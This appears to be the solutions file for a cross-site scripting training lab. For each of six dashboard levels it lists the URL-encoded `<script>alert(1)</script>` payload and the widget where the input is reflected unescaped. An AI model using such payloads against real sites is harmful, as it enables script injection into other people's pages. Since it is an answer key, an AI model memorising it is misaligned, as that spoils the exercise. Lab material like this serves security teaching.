# dashboard — solutions

Raw reflections in typical admin/dashboard widgets (cards, alerts, tables, modals, badges).

### dashboard-level1

`/dashboard/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in card-header div

### dashboard-level2

`/dashboard/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: reflected in td body (also in title attr); body sink is direct

### dashboard-level3

`/dashboard/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in alert div

### dashboard-level4

`/dashboard/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in `<a class="nav-link">` body

### dashboard-level5

`/dashboard/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside modal `<p>`

### dashboard-level6

`/dashboard/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in `<span class="badge">`
